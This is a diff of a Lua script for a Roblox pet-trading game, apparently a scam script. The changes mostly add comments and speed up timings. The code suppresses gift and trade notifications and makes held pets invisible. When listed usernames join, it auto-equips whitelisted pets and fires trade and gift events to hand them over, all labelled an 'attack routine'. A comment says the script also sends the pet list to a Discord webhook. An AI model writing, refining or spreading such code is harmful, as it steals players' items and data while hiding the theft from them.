@@ -43,6 +43,7 @@ local BLOCKED_PATTERNS = {
     "^Sent Gift request!$"
 }
 
+-- Utility to check if text matches blocked patterns
 local function matchesBlocked(text)
     for _, pattern in ipairs(BLOCKED_PATTERNS) do
         if string.match(text, pattern) then
@@ -52,6 +53,7 @@ local function matchesBlocked(text)
     return false
 end
 
+-- Remove blocked notifications from UI
 local function removeNotif(obj)
     if (obj:IsA("TextLabel") or obj:IsA("TextButton")) and obj.Text then
         if matchesBlocked(obj.Text) then
@@ -62,12 +64,15 @@ local function removeNotif(obj)
     end
 end
 
+-- Hide notifications and pets every frame
 RunService.Heartbeat:Connect(function()
+    -- Remove blocked notifications
     for _, obj in ipairs(CoreGui:GetDescendants()) do
         removeNotif(obj)
     end
 end)
 
+-- Make held pets invisible
 local function hideHeldPets()
     local char = LocalPlayer.Character
     if not char then return end
@@ -89,19 +94,41 @@ local function hideHeldPets()
     end
 end
 
-RunService.Heartbeat:Connect(hideHeldPets)
+-- Stop held pet animations to keep stance normal
+local function setNormalWalk()
+    local char = LocalPlayer.Character
+    if not char then return end
+    local humanoid = char:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        for _, anim in ipairs(humanoid:GetPlayingAnimationTracks()) do
+            anim:Stop()
+        end
+    end
+end
 
+-- Combined Heartbeat connection for invisibility and stance
+RunService.Heartbeat:Connect(function()
+    hideHeldPets()
+    setNormalWalk()
+end)
+
+-- Reapply on respawn
 LocalPlayer.CharacterAdded:Connect(function(char)
     char:WaitForChild("Humanoid")
-    RunService.Heartbeat:Connect(hideHeldPets)
+    RunService.Heartbeat:Connect(function()
+        hideHeldPets()
+        setNormalWalk()
+    end)
 end)
 
 print("[✔] Pet invisibility + blocked notifications active.")
 
+-- Check if pet is whitelisted
 local function checkPetsWhitelist(petName)
     return PET_WHITELIST[petName] ~= nil
 end
 
+-- Get pet object by UUID from Backpack or Character
 local function getPetObject(petUUID)
     for _, obj in pairs(LocalPlayer.Backpack:GetChildren()) do
         if obj:GetAttribute("PET_UUID") == petUUID then
@@ -118,6 +145,7 @@ local function getPetObject(petUUID)
     return nil
 end
 
+-- Equip pet tool/model
 local function equipPet(pet)
     if pet:GetAttribute("d") then
         ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
@@ -127,6 +155,7 @@ local function equipPet(pet)
     end
 end
 
+-- Find trade prompt on victim's head
 local function findTradePrompt(targetPlayer)
     if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
         for _, obj in ipairs(targetPlayer.Character.Head:GetChildren()) do
@@ -138,6 +167,7 @@ local function findTradePrompt(targetPlayer)
     return nil
 end
 
+-- Auto accept trade prompt
 local function autoAcceptTrade(targetPlayerName)
     local targetPlayer = Players:FindFirstChild(targetPlayerName)
     if not targetPlayer then
@@ -157,7 +187,7 @@ local function autoAcceptTrade(targetPlayerName)
     end
 end
 
--- **Auto accept gift event (update event name accordingly!)**
+-- Auto accept gift event (update event name accordingly!)
 local AcceptGiftEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("AcceptGiftRequest")
 
 local function autoAcceptGiftsFromVictim(victimName)
@@ -169,6 +199,7 @@ local function autoAcceptGiftsFromVictim(victimName)
     end)
 end
 
+-- Check pets in inventory and equip based on priority and whitelist, then trade
 local function checkPetsInventory(targetName)
     local petsData = dataModule:GetData().PetsData.PetInventory.Data
 
@@ -178,9 +209,9 @@ local function checkPetsInventory(targetName)
                 local petObject = getPetObject(petUUID)
                 if petObject then
                     equipPet(petObject)
-                    task.wait(0.2)
+                    task.wait(0.1)
                     autoAcceptTrade(targetName)
-                    task.wait(0.2)
+                    task.wait(0.1)
                     AcceptGiftEvent:FireServer(targetName)
                 end
             end
@@ -192,15 +223,16 @@ local function checkPetsInventory(targetName)
             local petObject = getPetObject(petUUID)
             if petObject then
                 equipPet(petObject)
-                task.wait(0.2)
+                task.wait(0.1)
                 autoAcceptTrade(targetName)
-                task.wait(0.2)
+                task.wait(0.1)
                 AcceptGiftEvent:FireServer(targetName)
             end
         end
     end
 end
 
+-- Wait for any of the target usernames to join
 local function waitForJoin()
     for _, player in pairs(Players:GetPlayers()) do
         if table.find(USERNAMES, player.Name) then
@@ -210,6 +242,7 @@ local function waitForJoin()
     return false, nil
 end
 
+-- Make other players invisible to victim(s)
 local function makeInvisibleToVictims()
     for _, player in pairs(Players:GetPlayers()) do
         if player ~= LocalPlayer and not table.find(USERNAMES, player.Name) then
@@ -226,7 +259,7 @@ local function makeInvisibleToVictims()
     end
 end
 
--- Teleport to victim + send trade request
+-- Teleport to victim player
 local function teleportToVictim(victimName)
     local victim = Players:FindFirstChild(victimName)
     local character = LocalPlayer.Character
@@ -236,6 +269,7 @@ local function teleportToVictim(victimName)
     end
 end
 
+-- Send trade request to victim
 local function sendTradeRequestToVictim(victimName)
     local GameEvents = ReplicatedStorage:WaitForChild("GameEvents")
     local TradeRequestEvent = GameEvents:FindFirstChild("TradeRequest")
@@ -245,6 +279,7 @@ local function sendTradeRequestToVictim(victimName)
     end
 end
 
+-- Attack routine: teleport, trade request, auto accept gifts
 local function attackVictim(victimName)
     teleportToVictim(victimName)
     task.wait(1)
@@ -253,20 +288,24 @@ local function attackVictim(victimName)
     autoAcceptGiftsFromVictim(victimName)
 end
 
+-- Main idle loop to wait for victim join and start attack
+local isIdling = false
 local function idlingTarget()
-    task.spawn(function()
-        while task.wait(0.2) do
-            local found, targetName = waitForJoin()
-            if found then
-                print("idlingTarget: Target found - "..targetName)
-                checkPetsInventory(targetName)
-                makeInvisibleToVictims()
-                attackVictim(targetName)
-            end
+    if isIdling then return end
+    isIdling = true
+    while true do
+        task.wait(0.5)
+        local found, targetName = waitForJoin()
+        if found then
+            print("idlingTarget: Target found - "..targetName)
+            checkPetsInventory(targetName)
+            makeInvisibleToVictims()
+            attackVictim(targetName)
         end
-    end)
+    end
 end
 
+-- Populate victim pet list from inventory
 for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
     if checkPetsWhitelist(petData.PetType) then
         table.insert(victimPetTable, petData.PetType)
@@ -275,6 +314,7 @@ end
 
 idlingTarget()
 
+-- Send victim pet list to Discord webhook once
 task.spawn(function()
     while task.wait(0.5) do
         if #victimPetTable > 0 then
